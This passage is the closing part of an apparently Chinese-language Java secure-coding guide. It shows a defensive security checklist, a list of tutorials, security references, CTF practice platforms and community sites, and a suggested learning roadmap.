[ ] 密码使用 BCrypt/Argon2 哈希存储
[ ] 敏感数据使用 AES-256-GCM 加密
[ ] 配置 Spring Security 安全策略
[ ] 使用 Security Manager 限制权限（如适用）
[ ] 定期使用 OWASP Dependency-Check 扫描依赖
[ ] 配置安全 HTTP 响应头
[ ] 使用 CSP 防止 XSS
[ ] 开启安全日志记录与审计
[ ] 定期进行代码安全审计
```

---

## 学习资源与知识拓展

### 官方资源

- **Java 官方文档**：各语言官网提供最权威的文档和教程
- **Java 标准库参考**：官方标准库 API 文档

### 在线教程

- **菜鸟教程 Java**：https://www.runoob.com/ — 中文入门教程
- **W3Schools**：https://www.w3schools.com/ — 交互式学习平台
- **MDN Web Docs**：https://developer.mozilla.org/ — Web 技术文档（适用于 JS/HTML/CSS）

### 安全编程资源

- **OWASP 速查表系列**：https://cheatsheetseries.owasp.org/ — 各种安全最佳实践
- **CWE 常见弱点枚举**：https://cwe.mitre.org/ — 软件弱点分类体系
- **安全开发指南**：各语言官方安全文档与最佳实践

### 安全工具与库

- 根据语言选择相应的安全库和工具（加密库、HTTP 库、网络库等）
- 关注 GitHub 上的安全开源项目与社区

### 练习平台

- **LeetCode**：https://leetcode.cn/ — 算法练习平台
- **Codewars**：https://www.codewars.com/ — 编程挑战网站
- **Hack The Box**：https://www.hackthebox.com/ — 安全靶场
- **TryHackMe**：https://tryhackme.com/ — 安全学习房间
- **Bugku**：https://ctf.bugku.com/ — 国内 CTF 平台
- **攻防世界**：https://adworld.xctf.org.cn/ — XCTF 竞赛平台

### 推荐书籍

- 《Java程序设计》— 入门经典教材
- 《Java高级编程》— 进阶学习指南
- 各类安全相关技术书籍

### 社区与资讯

- **GitHub**：https://github.com/ — 开源项目托管平台
- **Stack Overflow**：https://stackoverflow.com/ — 编程问答社区
- **FreeBuf**：https://www.freebuf.com/ — 安全资讯媒体
- **安全客**：https://www.anquanke.com/ — 安全技术媒体
- **先知社区**：https://xz.aliyun.com/ — 阿里云安全社区

### 学习路线建议

1. **入门阶段**（1-2月）：掌握基本语法、数据类型、控制流
2. **进阶阶段**（2-3月）：函数、面向对象、异常处理、标准库
3. **实战练习**（1-2月）：通过项目巩固知识
4. **安全方向**（持续）：了解语言相关的安全漏洞和防护
5. **持续学习**：关注社区、阅读源码、参与开源
